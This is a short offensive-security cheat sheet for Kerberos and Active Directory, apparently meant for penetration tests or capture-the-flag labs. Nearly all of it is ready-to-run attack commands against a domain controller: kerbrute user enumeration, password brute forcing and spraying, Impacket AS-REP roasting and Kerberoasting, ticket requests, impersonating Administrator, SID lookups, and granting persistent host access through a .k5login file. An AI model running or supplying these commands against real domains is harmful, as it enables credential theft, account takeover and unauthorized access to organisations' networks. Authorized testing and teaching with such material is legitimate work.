# Kerberos


## Sync time with the server 

    sudo ntpdate -d TARGET_IP
    sudo ntpdate DOMAIN.local
    net time -S TARGET_IP

## User enum

    kerbrute userenum -d DOMAIN --dc TARGET_IP /usr/share/seclists/Usernames/cirt-default-usernames.txt


## Brute user

    kerbrute bruteuser -d DOMAIN --dc TARGET_IP /usr/share/seclists/Passwords/darkweb2017-top1000.txt plop

## Password spraying 

    kerbrute passwordspray -d DOMAIN --dc TARGET_IP username.lst PASSWORD


## Impacket

### KRB_AS_REP Roasting

    GetNPUsers.py  DOMAIN/ -usersfile userKerb -no-pass

### Kerberoasting

    GetUserSPNs.py -dc-ip TARGET_IP 'DOMAIN/Username:PASSWORD'  -request   

    getST.py -dc-ip TARGET_IP -spn cifs/HOST.DOMAIN 'DOMAIN/Username:PASSWORD' 

### Requesting tickets

    getTGT.py 'DOMAIN/Username:PASSWORD'  

> Using tickets

    export KRB5CCNAME=Username.ccache 

    klist

    smbclient.py Username@HOST.DOMAIN -k -no-pass

### Impersonation tickets

    getST.py -dc-ip TARGET_IP -spn cifs/HOST.DOMAIN 'DOMAIN/Username:PASSWORD -impersonate Administrator

### lookupsid

    lookupsid.py DOMAIN/Username:PASSWORD@Target_IP
    
## Granting Access to user

The .k5login file, which resides in a userâ€™s home directory, contains a list of the Kerberos principals. Anyone with valid tickets for a principal in the file is allowed host access with the UID.

nano ~/.k5login

    username@domain
